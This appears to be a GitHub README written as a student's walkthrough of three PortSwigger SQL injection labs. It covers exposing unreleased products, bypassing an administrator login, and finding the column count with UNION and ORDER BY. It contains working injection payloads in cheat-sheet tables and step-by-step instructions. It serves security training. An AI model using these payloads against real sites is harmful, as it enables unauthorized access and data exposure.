
<h1 align="center">🧠 PortSwigger SQL Injection Labs</h1>

<p align="center">
  <b>🔍 Portswigger SQLi Labs</b><br>
  <i>Lab: SQL Injection vulnerability</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/focus-SQL%20Injection-darkred?style=flat-square">
  <img src="https://img.shields.io/badge/goal-Complete%20All%20Portswigger%20Labs-darkblue?style=flat-square">
</p>

---

<h3 align="center">🤫 Lab 1 - Retrieving Hidden Data via SQL Injection</h3>

<p align="center">
  <b>Lab: SQL Injection Vulnerability allows retriving hidden data</b><br>
  <i>Target: display unreleased products via SQL Injection.</i>
</p>

### 🧠 Lab Context

> This lab contains a SQL injection vulnerability in the product category filter. The application constructs a SQL query like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Your goal is to perform a SQLi attack and **display unreleased products**.

---

### 🎯 Goal

✅ **Exploit SQL Injection to bypass filter and display unreleased products.**

---

### 🛠️ Basic Injection Strategy

When selecting a category, the app builds the query dynamically without sanitization:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

You can inject a comment to nullify the second condition:

```http
https://insecure-website.com/products?category=Gifts'--
```

🔎 This results in:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

- `--` comments out the rest of the query.
- Now, **all products in 'Gifts'**, released or not, are shown.

---

### 🧪 Test: All Categories (OR Based)

Injecting logic always true to access everything:

```http
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Resulting SQL:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

- `1=1` is always true → All products from all categories shown.
---

### 🧩 Injection Cheat Sheet

| Injection Type | Payload | Effect |
|----------------|---------|--------|
| Comment | `'--` | Comments out the rest |
| Boolean OR | `' OR 1=1--` | Always true condition |
| Error-Based | `' AND 1=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(113)||CHR(122)||CHR(120)||CHR(113)||CHR(113) AS NUMERIC)--` | Can cause errors and leak info |

### ✅ Lab Status
> ✔️ **Completed** - Successfully display unreleased products.

------

<h3 align="center"> 💉Lab 2 - SQL Injection Vulnerability Allowing Login Bypass </h3>

<p align="center">
  <b>Lab: SQL Injection Vulnerability Allowing Login Bypass</b><br>
  <i>Target: Login as <code>administrator</code> by bypassing authentication via SQL Injection.</i>
</p>

### 🎯 Objective
Perform a SQL injection attack to log in to the application as the `administrator` user.

---

### 🧪 Scenario Description

This lab contains a SQL injection vulnerability in the **login function**.

The application executes a SQL query similar to:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

Since the application doesn’t implement proper sanitization, you can exploit this to bypass authentication.

---

### 🧠 Understanding the Attack
Injecting the following payload into the `username` field:
```
administrator'--
```

### Why it works?
This transforms the backend query to:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Here:
- `--` comments out the rest of the query (including password check)
- Only the username is validated, and since it's correct, login is bypassed

---

### 🧰 Tools Used
- 🔍 **Burp Suite**: Used to intercept and modify HTTP request
- 🔑 **Browser**: To view result post-exploit

---

### 🚦 Steps to Solve
<details>
<summary>📋 <strong>Step-by-step Instructions</strong></summary>

1. Open the target application in your browser.
2. Intercept the login request using **Burp Suite**.
3. Modify the `username` field as follows:

   ```administrator'-- ```
   or 
   username=administrator & inject the payload into the password field = ``` ' OR 1=1 --' ```

4. Leave the password blank or anything.
5. Forward the request.
6. You should now be logged in as the administrator.
</details>

---
### ✅ Lab Status
> ✔️ **Completed** - Successfully bypassed authentication and logged in as administrator.
---


<h3 align="center">🔍 Lab 3 - Determining Number of Columns via UNION SQL Injection</h3>

<p align="center">
  <b>Lab: SQL injection UNION attack, determining the number of columns returned by the query</b><br>
  <i>Target: determine number of columns via SQLi + UNION attack.</i>
</p>

### 🧠 Lab Context

> This lab contains a SQL injection vulnerability in the product category filter. 
> The results from the query are returned in the application's response.

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

Your goal is to inject a UNION-based payload that matches the column count of the original query.

---

### 🎯 Goal

✅ **Exploit UNION-based SQLi to determine the number of columns in the original query.**

---

### 🛠️ UNION Injection Strategy

The application returns SQL results directly in the HTTP response, allowing you to probe using:

```http
category='+UNION+SELECT+NULL--
```

If the number of `NULL` values doesn't match the original columns, it throws an error. You iterate:

```http
category='+UNION+SELECT+NULL,NULL--
category='+UNION+SELECT+NULL,NULL,NULL--
...
```

Until it works.

This lets you determine how many columns the original query returns.

---

### 🔢 Alternative Strategy: ORDER BY

You can also infer column count using `ORDER BY`:

```http
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

When the ORDER BY number exceeds the actual column count, an error will be shown.

---

### 🧪 Payload Testing Table

| Technique        | Payload                            | Description                                      |
|------------------|------------------------------------|--------------------------------------------------|
| UNION Null Test  | `'+UNION+SELECT+NULL--` | Initial test for 1 column                        |
| UNION Null Test  | `'+UNION+SELECT+NULL,NULL--` | Test for 2 columns                               |
| UNION Null Test  | `'+UNION+SELECT+NULL,NULL,NULL--` | Test for 3 columns (likely success here)         |
| ORDER BY         | `' ORDER BY 1--` | Orders by column 1                               |
| ORDER BY         | `' ORDER BY 3--` | If this breaks → original has less than 3 cols   |

### ✅ Lab Status

> ✔️ Completed - Null-based UNION injection to identify correct column count.

------
### 📚 Learning Takeaways

- SQL comments can terminate rest of a query.
- Boolean logic can bypass conditions.
- Always validate and sanitize user input.

---

### 🚨 Disclaimer

> ⚠️ For **educational purposes only**. Do **not** perform SQLi on systems you don't own or have explicit permission to test.

---

### 🧑‍💻 Author

Built with ❤️ by [PardhuVarma](https://linkedin.com/in/pardhu-sri-rushi-varma-konduru-696886279)

<p align="center">
  <img src="https://img.shields.io/badge/status-Lab%20in%20Progress-darkgreen?style=for-the-badge">
</p>
